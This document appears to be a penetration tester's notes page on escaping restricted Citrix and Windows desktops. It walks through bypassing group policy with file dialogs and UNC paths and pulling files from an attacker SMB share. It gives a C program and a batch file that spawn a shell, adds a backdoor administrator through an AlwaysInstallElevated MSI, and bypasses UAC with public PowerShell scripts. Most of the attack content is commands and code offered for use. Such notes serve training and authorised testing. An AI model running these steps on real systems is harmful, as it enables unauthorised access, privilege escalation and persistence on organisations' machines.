# Restricted Environments

### Citrix breakout

#### Bypassing path restrictions

When we attempt to visit C:\Users using File Explorer, we find it is restricted and results in an error. This indicates that group policy has been implemented to restrict users from browsing directories in the C:\ drive using File Explorer.

In that case, the goal is to try to open a dialog box to bypass the restrictions

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FaLZVK2UjQ2iRwI4laH1k%2Fimage.png?alt=media&#x26;token=03b57f87-b533-4d05-b20a-9006f449a127" alt=""><figcaption></figcaption></figure>

For example, in MS paint, we can go on `File` > `Open` to open a dialog box

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FD0p6vVEPsbE4ihaCgEck%2Fimage.png?alt=media&#x26;token=89a5207b-bff2-47ae-b101-71980712e672" alt=""><figcaption></figcaption></figure>

Then wan can access a forbidden path by calling the file name using an [UNC](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths) path and setting the files type to `All Files`

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FSQFhLqhVKRznbwsZ3cLK%2Fimage.png?alt=media&#x26;token=d673c055-ea39-4105-8f23-658b5cb9aa54" alt=""><figcaption></figcaption></figure>

#### Accessing SMB shares from a restricted environment

If we want to transfer files via SMB shares from our attacker to the target and we can’t because of restrictions, we can use the following

```shellscript
# Open a smb file share on the attacker
smbserver.py -smb2support share $(pwd)
```

Then open paint, `File` > `Open` and enter the UNC path to the share while setting files to `All Files`

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F38VMnUOiHm5Lh82IORat%2Fimage.png?alt=media&#x26;token=f6c86c37-70f5-4be0-ae2f-1606864d1462" alt=""><figcaption></figcaption></figure>

Due to the presence of restrictions within the File Explorer, direct file copying is not viable. Nevertheless, an alternative approach involves `right-clicking` on the executables and subsequently launching them. Right-click on the `pwn.exe` binary and select `Open`, which should prompt us to run it and a cmd console will be opened

The `pwn.exe` would be the compiled version of the below C script, which opens a cmd prompt

```shellscript
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

From the obtained shell

```shellscript
# Switch to powershell 
powershell -ep bypass

# Then we can access our share and copy files
```

#### Alternate explorer

In cases where strict restrictions are imposed on File Explorer, alternative File System Editors like Q-Dir or Explorer++ can be employed as a workaround. These tools can bypass the folder restrictions enforced by group policy, allowing users to navigate and access files and directories that would otherwise be restricted within the standard File Explorer environment.

{% embed url="https://explorerplusplus.com/" %}

#### Alternate registry editors

Similarly when the default Registry Editor is blocked by group policy, alternative Registry editors can be employed to bypass the standard group policy restrictions. [Simpleregedit](https://sourceforge.net/projects/simpregedit/), [Uberregedit](https://sourceforge.net/projects/uberregedit/) and [SmallRegistryEditor](https://sourceforge.net/projects/sre/) are examples of such GUI tools that facilitate editing the Windows registry without being affected by the blocking imposed by group policy

#### Modifying existing shortcut file

Right click the desired shortcut and select properties

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F29SIuxM4IzoMkx61QpKJ%2Fimage.png?alt=media&#x26;token=878832de-229d-4072-92ae-cb63d1450dbf" alt=""><figcaption></figcaption></figure>

Put the intended path in the `Target` field

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FvCvjotbRMnAUHFQLVUkx%2Fimage.png?alt=media&#x26;token=f5639c97-d632-450a-9b60-ad904bd8e04f" alt=""><figcaption></figcaption></figure>

Then execute the shortcut

In cases where an existing shortcut file is unavailable, there are alternative methods to consider. One option is to transfer an existing shortcut file using an SMB server

#### Script execution

When script extensions such as `.bat`, `.vbs`, or `.ps` are configured to automatically execute their code using their respective interpreters, it opens the possibility of dropping a script that can serve as an interactive console or facilitate the download and launch of various third-party applications which results into bypass of restrictions in place.

* Create a new text file and name it "evil.bat".
* Open "evil.bat" with a text editor such as Notepad.
* Input the command "cmd" into the file.
* Save the file and execute

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FHxH2G0pzOcBHsWkP1odj%2Fimage.png?alt=media&#x26;token=4cada013-9c05-4da3-b16d-214b2b270925" alt=""><figcaption></figcaption></figure>

#### Escalating privileges

If we find that Always Install Elevated key is present and set (0x1)

```shellscript
# Validate manually
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Create and .msi file 
Import-Module .\PowerUp.ps1
Write-UserAddMSI

# Execute the .msi, which will launch a window asking for username, pass and group
# If the pass doesn't match the pass policy, an error will be thrown

# Then use runas to get a shell as that new user
runas /user:<NEW_USER> cmd
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FrExj8hHpbOADNUFkQpHh%2Fimage.png?alt=media&#x26;token=288d31de-febe-4a1e-804b-774b44b55f1f" alt=""><figcaption></figcaption></figure>

Even though the newly established user backdoor is a member of Administrators group, accessing the `C:\users\Administrator` directory remains unfeasible due to the presence of User Account\
Control (UAC). UAC is a security mechanism implemented in Windows to protect the operating system from unauthorized changes. With UAC, each application that requires the administrator access token must prompt the end user for consent.

{% embed url="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC" %}

```shellscript
# Try to bypass UAC
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep

# If successfull, a new cmd prompt should be opened with the new privs
```
